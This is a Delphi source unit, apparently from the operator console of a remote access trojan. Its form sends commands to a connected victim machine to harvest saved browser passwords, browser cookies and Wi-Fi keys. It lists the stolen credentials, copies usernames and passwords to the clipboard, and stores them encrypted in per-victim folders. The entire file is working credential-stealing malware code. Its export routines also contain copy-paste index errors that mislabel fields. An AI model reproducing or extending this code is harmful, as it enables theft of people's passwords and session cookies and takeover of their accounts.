unit UnitPasswords;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, jpeg, ExtCtrls, acImage, ComCtrls, ToolWin, StdCtrls, Buttons,
  sSpeedButton, UnitMain, SocketUnitEx, UnitCommands, UnitFunctions,
  UnitVariables, UnitRepository, UnitConstants, UnitEncryption, ImgList,
  Menus, UnitManager;

type
  TFormPasswords = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn3: TToolButton;
    pb1: TProgressBar;
    pnlPasswords: TPanel;
    lvPasswords: TListView;
    il1: TImageList;
    btn4: TToolButton;
    pnlCookies: TPanel;
    lvCookies: TListView;
    pm1: TPopupMenu;
    pm2: TPopupMenu;
    R1: TMenuItem;
    N1: TMenuItem;
    C1: TMenuItem;
    C2: TMenuItem;
    C3: TMenuItem;
    R2: TMenuItem;
    btn2: TToolButton;
    pnlWifi: TPanel;
    lvWifi: TListView;
    pm3: TPopupMenu;
    MenuItem1: TMenuItem;
    N2: TMenuItem;
    C4: TMenuItem;
    C5: TMenuItem;
    procedure btn4Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure C3Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure MenuItem1Click(Sender: TObject);
    procedure C4Click(Sender: TObject);
    procedure C5Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
  private
    { Private declarations }
    Client: TClientDatas;
    function RetrievePasswords: string;
    function RetrieveCookies: string;
    function RetrieveWifi: string;          
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }                  
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormPasswords: TFormPasswords;

implementation

{$R *.dfm}
                    
constructor TFormPasswords.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;
         
procedure TFormPasswords.AddLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormPasswords.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormPasswords.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormPasswords.btn4Click(Sender: TObject);
var
  TmpRes: TResourceStream;
begin
  pnlCookies.BringToFront;
  if lvCookies.Items.Count = 0 then R2Click(Sender);
end;

procedure TFormPasswords.WndProc(var Msg: TMessage);
var
  MainCommand, Datas: string;
  TmpItem: TListItem;
  TmpList: TStringArray;
  TmpStr, TmpStr1: string;
  i: Integer;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    MainCommand := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = BROWSERSPASSWORDS then
    begin
      lvPasswords.Clear;

      if Datas = '' then
      begin
        AddRecvLog('Browsers passwords not found', clRed);
        Exit;
      end;

      while Datas <> '' do
      begin
        Self.Refresh;
        Application.ProcessMessages;

        TmpStr := Copy(Datas, 1, Pos('_', Datas) - 1);
        Delete(Datas, 1, Pos('_', Datas) + 1);

        pb1.Max := StringCount(#13#10, TmpStr);
        pb1.Position := 0;

        lvPasswords.Items.BeginUpdate;

        while TmpStr <> '' do
        begin
          Application.ProcessMessages;
          pb1.Position := pb1.Position + 1;

          TmpStr1 := Copy(TmpStr, 1, Pos(#13#10, TmpStr) - 1);
          Delete(TmpStr, 1, Pos(#13#10, TmpStr) + 1);

          TmpList := ParseString('|', TmpStr1);

          TmpItem := lvPasswords.Items.Add;
          TmpItem.Caption := TmpList[0];
          TmpItem.SubItems.Add(TmpList[1]);
          TmpItem.SubItems.Add(TmpList[2]);
          TmpItem.SubItems.Add(TmpList[3]);

          if TmpList[0] = 'Mozilla Firefox' then TmpItem.ImageIndex := 0 else
          if TmpList[0] = 'Google Chrome' then TmpItem.ImageIndex := 1 else
          if TmpList[0] = 'Opera' then TmpItem.ImageIndex := 2 else
          if TmpList[0] = 'FileZilla' then TmpItem.ImageIndex := 3 else
          if TmpList[0] = 'Yandex' then TmpItem.ImageIndex := 4 else TmpItem.ImageIndex := -1;
        end;
      end;

      lvPasswords.Items.EndUpdate;
      AddRecvLog(IntToStr(lvPasswords.Items.Count) + ' browsers passwords found');

      TmpStr := GetPasswordsFolder(Client.UserId);
      TmpStr := TmpStr + '\' + MyGetDate('-') + '.data';
      TmpStr1 := EnDecryptText(RetrievePasswords, PROGRAMPASSWORD);
      MyCreateFile(TmpStr, TmpStr1, Length(TmpStr1));
      AddLog('Browsers passwords saved');
    end
    else

    if MainCommand = BROWSERSCOOKIES then
    begin
      lvCookies.Clear;

      if Datas = '' then
      begin
        AddRecvLog('Browsers cookies not found', clRed);
        Exit;
      end;

      while Datas <> '' do
      begin                
        Self.Refresh;
        Application.ProcessMessages;

        TmpStr := Copy(Datas, 1, Pos('_', Datas) - 1);
        Delete(Datas, 1, Pos('_', Datas) + 1);

        pb1.Max := StringCount(#13#10, TmpStr);
        pb1.Position := 0;

        lvCookies.Items.BeginUpdate;

        while TmpStr <> '' do
        begin
          Application.ProcessMessages;
          pb1.Position := pb1.Position + 1;

          TmpStr1 := Copy(TmpStr, 1, Pos(#13#10, TmpStr) - 1);
          Delete(TmpStr, 1, Pos(#13#10, TmpStr) + 1);

          TmpList := ParseString('|', TmpStr1);

          TmpItem := lvCookies.Items.Add;
          TmpItem.Caption := TmpList[0];
          TmpItem.SubItems.Add(TmpList[1]);
          TmpItem.SubItems.Add(TmpList[2]);
          TmpItem.SubItems.Add(TmpList[3]);
          TmpItem.SubItems.Add(TmpList[4]);
          TmpItem.SubItems.Add(TmpList[5]);
          TmpItem.SubItems.Add(TmpList[6]);
          TmpItem.SubItems.Add(TmpList[7]);

          if TmpList[0] = 'Mozilla Firefox' then TmpItem.ImageIndex := 0 else
          if TmpList[0] = 'Google Chrome' then TmpItem.ImageIndex := 1 else
          if TmpList[0] = 'Opera' then TmpItem.ImageIndex := 2 else
          if TmpList[0] = 'Yandex' then TmpItem.ImageIndex := 4 else TmpItem.ImageIndex := -1;
        end;

        lvCookies.Items.EndUpdate;
        AddRecvLog(IntToStr(lvCookies.Items.Count) + ' browsers cookies found');
      end;

      TmpStr := GetPasswordsFolder(Client.UserId);
      TmpStr := TmpStr + '\Cookies';
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      TmpStr := TmpStr + '\' + MyGetDate('-') + '.data';
      TmpStr1 := EnDecryptText(RetrieveCookies, PROGRAMPASSWORD);
      MyCreateFile(TmpStr, TmpStr1, Length(TmpStr1));     
      AddLog('Browsers cookies saved');
    end
    else

    if MainCommand = WIFIPASSWORDS then
    begin
      lvWifi.Clear;

      if Datas = '' then
      begin
        AddRecvLog('Wifi passwords not found', clRed);
        Exit;
      end;

      pb1.Max := StringCount(#13#10, Datas);
      pb1.Position := 0;

      lvWifi.Items.BeginUpdate;

      while Datas <> '' do
      begin                           
        Self.Refresh;
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;

        TmpStr := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        TmpList := ParseString('|', TmpStr);

        TmpItem := lvWifi.Items.Add;
        TmpItem.Caption := TmpList[0];
        TmpItem.SubItems.Add(TmpList[1]);
        TmpItem.SubItems.Add(UpperCase(TmpList[2]));
        TmpItem.SubItems.Add(TmpList[3]);
        TmpItem.SubItems.Add(TmpList[4]);
        TmpItem.SubItems.Add(TmpList[5]);
        TmpItem.SubItems.Add(UpperCase(TmpList[6]));
        TmpItem.SubItems.Add(TmpList[7]);
        TmpItem.ImageIndex := -1;
      end;

      lvWifi.Items.EndUpdate;  
      AddRecvLog(IntToStr(pb1.Max) + ' wifi passwords found');

      TmpStr := GetPasswordsFolder(Client.UserId);
      TmpStr := TmpStr + '\' + MyGetDate('-') + '.data';
      TmpStr1 := EnDecryptText(RetrieveWifi, PROGRAMPASSWORD);
      MyCreateFile(TmpStr, TmpStr1, Length(TmpStr1));   
      AddLog('Wifi passwords saved');
    end;
  end;
end;

procedure TFormPasswords.btn1Click(Sender: TObject);
var
  TmpRes: TResourceStream;
begin
  pnlPasswords.BringToFront;
  if lvPasswords.Items.Count = 0 then R1Click(Sender);
end;

function TFormPasswords.RetrievePasswords: string;
var
  i: Integer;
begin
  Result := '';
  for i := 0 to lvPasswords.Items.Count - 1 do
  begin
    Result := Result + lvPasswords.Column[0].Caption + ': ' + lvPasswords.Items.Item[i].Caption + #13#10;
    Result := Result + lvPasswords.Column[1].Caption + ': ' + lvPasswords.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + lvPasswords.Column[2].Caption + ': ' + lvPasswords.Items.Item[i].SubItems.Strings[1] + #13#10;
    Result := Result + lvPasswords.Column[3].Caption + ': ' + lvPasswords.Items.Item[i].SubItems.Strings[2] + #13#10;
    Result := Result + #13#10#13#10;
  end;
end;
   
function TFormPasswords.RetrieveCookies: string;
var
  i: Integer;
begin
  Result := '';
  for i := 0 to lvCookies.Items.Count - 1 do
  begin
    Result := Result + lvCookies.Column[0].Caption + ': ' + lvCookies.Items.Item[i].Caption + #13#10;
    Result := Result + lvCookies.Column[1].Caption + ': ' + lvCookies.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + lvCookies.Column[2].Caption + ': ' + lvCookies.Items.Item[i].SubItems.Strings[1] + #13#10;
    Result := Result + lvCookies.Column[3].Caption + ': ' + lvCookies.Items.Item[i].SubItems.Strings[2] + #13#10;
    Result := Result + lvCookies.Column[4].Caption + ': ' + lvCookies.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + lvCookies.Column[5].Caption + ': ' + lvCookies.Items.Item[i].SubItems.Strings[1] + #13#10;
    Result := Result + lvCookies.Column[6].Caption + ': ' + lvCookies.Items.Item[i].SubItems.Strings[2] + #13#10;
    Result := Result + lvCookies.Column[7].Caption + ': ' + lvCookies.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + #13#10#13#10;
  end;
end;

procedure TFormPasswords.R1Click(Sender: TObject);
begin
  Client.SendDatas(BROWSERSPASSWORDS + '|');
  AddSentLog('Get browsers passwords');
end;

procedure TFormPasswords.C2Click(Sender: TObject);
begin
  if not Assigned(lvPasswords.Selected) then Exit;
  SetClipboardText(lvPasswords.Selected.SubItems[0]);
  AddLog('Url ' + lvPasswords.Selected.SubItems[0] + ' copied to clipboard');
end;

procedure TFormPasswords.C1Click(Sender: TObject);
begin
  if not Assigned(lvPasswords.Selected) then Exit;
  SetClipboardText(lvPasswords.Selected.SubItems[1]);
  AddLog('Username ' + lvPasswords.Selected.SubItems[1] + ' copied to clipboard');
end;

procedure TFormPasswords.C3Click(Sender: TObject);
begin
  if not Assigned(lvPasswords.Selected) then Exit;
  SetClipboardText(lvPasswords.Selected.SubItems[2]); 
  AddLog('Password ' + lvPasswords.Selected.SubItems[2] + ' copied to clipboard');
end;

procedure TFormPasswords.R2Click(Sender: TObject);
begin
  Client.SendDatas(BROWSERSCOOKIES + '|');
  AddSentLog('Get browsers cookies');
end;

procedure TFormPasswords.MenuItem1Click(Sender: TObject);
begin
  Client.SendDatas(WIFIPASSWORDS + '|');
  AddSentLog('Get wifi passwords <- this process can takes a while, please wait');
end;

procedure TFormPasswords.C4Click(Sender: TObject);
begin
  if not Assigned(lvWifi.Selected) then Exit;
  SetClipboardText(lvWifi.Selected.Caption);    
  AddLog('SSID ' + lvWifi.Selected.Caption + ' copied to clipboard');
end;

procedure TFormPasswords.C5Click(Sender: TObject);
begin
  if not Assigned(lvWifi.Selected) then Exit;
  SetClipboardText(lvWifi.Selected.SubItems[6]);
  AddLog('Password ' + lvWifi.Selected.SubItems[0] + ' copied to clipboard');
end;

procedure TFormPasswords.btn2Click(Sender: TObject);   
begin
  pnlWifi.BringToFront;
  if lvWifi.Items.Count = 0 then MenuItem1Click(Sender);
end;
  
function TFormPasswords.RetrieveWifi: string;
var
  i: Integer;
begin
  Result := '';
  for i := 0 to lvWifi.Items.Count - 1 do
  begin
    Result := Result + lvWifi.Column[0].Caption + ': ' + lvWifi.Items.Item[i].Caption + #13#10;
    Result := Result + lvWifi.Column[1].Caption + ': ' + lvWifi.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + lvWifi.Column[2].Caption + ': ' + lvWifi.Items.Item[i].SubItems.Strings[1] + #13#10;
    Result := Result + lvWifi.Column[3].Caption + ': ' + lvWifi.Items.Item[i].SubItems.Strings[2] + #13#10;
    Result := Result + lvWifi.Column[4].Caption + ': ' + lvWifi.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + lvWifi.Column[5].Caption + ': ' + lvWifi.Items.Item[i].SubItems.Strings[1] + #13#10;
    Result := Result + lvWifi.Column[6].Caption + ': ' + lvWifi.Items.Item[i].SubItems.Strings[2] + #13#10;
    Result := Result + lvWifi.Column[7].Caption + ': ' + lvWifi.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + #13#10#13#10;
  end;
end;

end.
